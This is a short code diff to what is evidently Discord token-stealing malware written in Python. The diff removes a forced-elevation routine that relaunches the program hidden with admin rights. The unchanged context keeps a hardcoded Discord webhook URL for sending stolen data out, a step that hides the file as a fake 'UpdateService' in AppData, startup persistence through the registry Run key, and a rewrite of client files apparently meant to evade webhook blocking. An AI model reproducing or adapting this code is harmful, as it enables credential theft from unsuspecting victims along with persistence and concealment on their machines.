@@ -18,7 +18,6 @@ tokenPaths = {
 
 config = {
 	"Startup": True,
-	"Force_admin": True,
 	"Hide_self": True,
 	"webhook": 'https://discord.com/api/webhooks/1039097523643633684/-DWH0IuPWBN1SuX8Oh-7fnFs14TQfbp3yWgEcM0RGTzu4u2VyNsRxGqTUk-gclmEWWFv',
 }
@@ -26,7 +25,6 @@ config = {
 class main():
 	def __init__(self):
 		self.waitForInternet()
-		if config['Force_admin']: self.forceadmin()
 		self.filename = os.path.basename(__file__).replace('.py', '.exe')
 		if config['Hide_self'] and sys.argv[0] == f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService/{self.filename}': ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 0x02)
 
@@ -115,10 +113,6 @@ class main():
 				txt = f.read()
 				content = txt.replace('api/webhooks', 'api/nethooks')
 			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
-
-	def forceadmin(self):
-		self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \'{sys.argv[0]}\' -WindowStyle Hidden -verb runAs -ArgumentList \'--nouacbypass\'>nul')
-		sys.exit()
 
 	def startup(self):
 		try: self.system("powershell Get-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name UpdateService")
